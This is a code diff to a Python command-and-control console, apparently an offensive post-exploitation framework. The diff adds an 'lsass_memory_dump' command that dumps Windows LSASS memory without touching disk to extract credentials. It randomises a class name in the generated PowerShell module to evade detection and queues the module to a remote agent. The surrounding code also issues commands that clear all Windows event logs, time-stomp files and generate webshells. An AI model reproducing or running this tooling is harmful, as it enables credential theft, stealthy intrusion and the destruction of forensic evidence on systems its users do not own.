@@ -69,7 +69,8 @@ class cmd:
      'list_agents',
      'generate_webshell',
      'time_stomp',
-     'clear_all_logs']
+     'clear_all_logs',
+     'lsass_memory_dump']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -111,7 +112,8 @@ class cmd:
      ['list_webshells', 'list all webshells registered )'],
      ['list_agents', 'list all agents )'],
      ['time_stomp', 'change the ( access , modify , creation ) time of destination file as same as the source file ) . Usage time_stomp < source path > < destination path >'],
-     ['clear_all_logs', 'this command will clear all windows event logs in the system']]
+     ['clear_all_logs', 'this command will clear all windows event logs in the system'],
+     ['lsass_memory_dump', 'dump lsass memory without touching the disk then parse it and provide credentials )']]
 
     def help(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
@@ -709,3 +711,20 @@ class cmd:
             #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""wevtutil cl "Windows PowerShell" """))
             #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""for /f %x in ('wevtutil el') do wevtutil cl "%x" """))
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}"""))
+
+    def lsass_memory_dump(self, args=None):
+        if config.get_pointer()=='main':
+            print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
+
+
+        fp = open('Modules/SafetyDump.ninja', 'r')
+        temp = fp.read()
+        temp=temp.replace('{class}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
+        output=open('Modules/SafetyDump.ps1', 'w')
+        output.write(temp)
+        output.close()
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SafetyDump.ps1"))
